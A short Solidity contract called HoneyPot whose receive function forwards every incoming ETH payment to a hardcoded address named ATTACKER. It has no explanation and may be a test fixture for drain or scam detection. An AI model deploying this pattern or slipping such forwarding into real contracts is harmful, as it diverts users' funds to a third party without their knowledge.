// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract HoneyPot {
  address constant ATTACKER = 0x283d3a8ab7c9a1E2f8017B365FebAF90802Ce895;

  receive() external payable {
    (bool success, ) = payable(ATTACKER).call{value: msg.value}('');
    require(success, 'ETH transfer failed');
  }
}
